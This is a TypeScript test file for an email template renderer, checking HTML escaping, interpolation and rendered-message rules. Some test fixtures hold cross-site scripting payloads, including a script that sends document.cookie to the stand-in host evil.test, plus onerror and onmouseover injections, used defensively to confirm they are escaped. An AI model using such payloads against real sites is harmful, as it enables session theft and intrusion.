import { describe, it, expect } from 'vitest';
import { render, interpolate, escapeHtml, TemplateError, DEFAULT_TEMPLATES } from './templates.ts';

/**
 * P4d — template rendering.
 *
 * The interesting cases are all injection. `Email` is whatever a signup form was
 * handed and `ProjectName` is whatever a customer typed, so both are
 * attacker-controlled in the flows that matter — and this mail goes out over a
 * domain every project shares.
 */
describe('P4d — escaping', () => {
  it('escapes quotes as well as angle brackets', () => {
    // An interpolation can land in text or inside an attribute, and this function
    // does not know which — so it escapes for both.
    expect(escapeHtml(`<b>&"'`)).toBe('&lt;b&gt;&amp;&quot;&#39;');
  });

  it('escapes an address that is trying to inject markup', () => {
    const out = render('confirmation', {
      Email: '"><script>fetch("//evil.test?c="+document.cookie)</script>',
      ConfirmationURL: 'https://app.example.com/v?token=x',
      ProjectName: 'Acme',
    });
    expect(out.html).not.toContain('<script>');
    expect(out.html).toContain('&lt;script&gt;');
  });

  it('escapes a project name in both the paragraph and the footer', () => {
    const out = render('confirmation', {
      Email: 'a@b.test', ConfirmationURL: 'https://app.example.com/v?token=x',
      ProjectName: '<img src=x onerror=alert(1)>',
    });
    expect(out.html).not.toContain('<img');
    // The footer interpolates it separately, which is exactly the spot a second
    // escape gets forgotten.
    expect(out.html.split('&lt;img').length - 1).toBeGreaterThanOrEqual(2);
  });

  it('leaves the text part unescaped, because a &amp; in a link is a broken link',
    () => {
      const out = render('confirmation', {
        Email: 'a@b.test', ProjectName: 'Acme',
        ConfirmationURL: 'https://app.example.com/v?token=x&type=signup',
      });
      expect(out.text).toContain('token=x&type=signup');
      // …and the HTML part still carries the escaped form.
      expect(out.html).toContain('token=x&amp;type=signup');
    });
});

describe('P4d — interpolation', () => {
  it('accepts the doc\'s spacing variants', () => {
    const vars = { Email: 'a@b.test' };
    for (const form of ['{{ .Email }}', '{{.Email}}', '{{  .Email  }}']) {
      expect(interpolate(form, vars, (v) => v)).toBe('a@b.test');
    }
  });

  it('throws on an unknown variable rather than rendering nothing', () => {
    // The alternative is a recovery mail whose only link is the empty string:
    // it looks like a broken product and the user who got it cannot report it
    // usefully.
    expect(() => interpolate('{{ .Nonsense }}', { Email: 'a@b.test' }, (v) => v))
      .toThrow(TemplateError);
  });

  it('throws when a known variable has no value for this message', () => {
    expect(() => interpolate('{{ .NewEmail }}', { NewEmail: undefined }, (v) => v))
      .toThrow(/no value/);
  });
});

describe('P4d — rendered messages', () => {
  it('renders both parts from one source, with the action link in each', () => {
    const url = 'https://app.example.com/verify?token=abc';
    const out = render('recovery', {
      Email: 'user@example.com', ConfirmationURL: url, ProjectName: 'Acme' });
    expect(out.subject).toBe('Reset your password');
    expect(out.html).toContain(`href="${url}"`);
    // The URL appears in plain text too, for the client that cannot render the
    // button and for the user who copies it.
    expect(out.html).toContain('Or paste this link');
    expect(out.text).toContain(url);
    expect(out.text).not.toContain('<');
  });

  it('omits the button entirely when a template has no action', () => {
    const out = render('account_exists_notice', {
      Email: 'user@example.com', ProjectName: 'Acme' });
    // Deliberate: this mail is triggered by an anonymous stranger, so a
    // password-reset link in it would be a reset anybody could send to anybody.
    expect(out.html).not.toContain('<a href');
    expect(out.text).not.toContain('http');
  });

  it('omits the button when a template wants one and no URL was given', () => {
    // Better a mail with no button than an `href=""` that looks broken.
    const out = render('confirmation', { Email: 'a@b.test', ProjectName: 'Acme' });
    expect(out.html).not.toContain('<a href');
  });

  it('falls back to a neutral project name rather than the string "undefined"', () => {
    const out = render('confirmation', {
      Email: 'a@b.test', ConfirmationURL: 'https://x.test/v' });
    expect(out.html).toContain('this app');
    expect(out.html).not.toContain('undefined');
    expect(out.text).not.toContain('undefined');
  });

  it('honours a project\'s subject and body override', () => {
    const out = render('confirmation',
      { Email: 'a@b.test', ConfirmationURL: 'https://x.test/v', ProjectName: 'Acme' },
      { subject: 'Welcome to Acme', body: ['Tap below to confirm {{ .Email }}.'] });
    expect(out.subject).toBe('Welcome to Acme');
    expect(out.text).toContain('Tap below to confirm a@b.test.');
    expect(out.html).not.toContain('finish setting up');
  });

  it('escapes an override too — an override is customer input like any other', () => {
    const out = render('confirmation',
      { Email: '<b>x</b>@b.test', ConfirmationURL: 'https://x.test/v', ProjectName: 'Acme' },
      { body: ['Hello {{ .Email }}'] });
    expect(out.html).not.toContain('<b>x</b>');
  });

  it('escapes a quote in the action URL rather than ending the href', () => {
    // The URL is built by us, so this is not a live injection point — but it
    // embeds a project-configured redirect, and an href is a string in markup
    // like any other. The first version of `layout` interpolated it raw.
    const out = render('confirmation', {
      Email: 'a@b.test', ProjectName: 'Acme',
      ConfirmationURL: 'https://x.test/v?t=1" onmouseover="alert(1)',
    });
    expect(out.html).not.toContain('onmouseover="alert(1)"');
    expect(out.html).toContain('&quot; onmouseover=&quot;');
  });

  it('has no remote content in any default template', () => {
    // Every image is a remote fetch most clients block and every spam filter
    // notices. A transactional mail that reads like a receipt lands in the inbox.
    for (const name of Object.keys(DEFAULT_TEMPLATES) as Array<keyof typeof DEFAULT_TEMPLATES>) {
      const out = render(name, {
        Email: 'a@b.test', NewEmail: 'c@d.test',
        ConfirmationURL: 'https://x.test/v', SiteURL: 'https://x.test',
        ProjectName: 'Acme' });
      expect(out.html).not.toMatch(/<img|background-image|<link|<script/i);
      // And every default renders without throwing, which is the check that
      // catches a variable named in a template but absent from the type.
      expect(out.subject.length).toBeGreaterThan(0);
      expect(out.text.length).toBeGreaterThan(0);
    }
  });
});
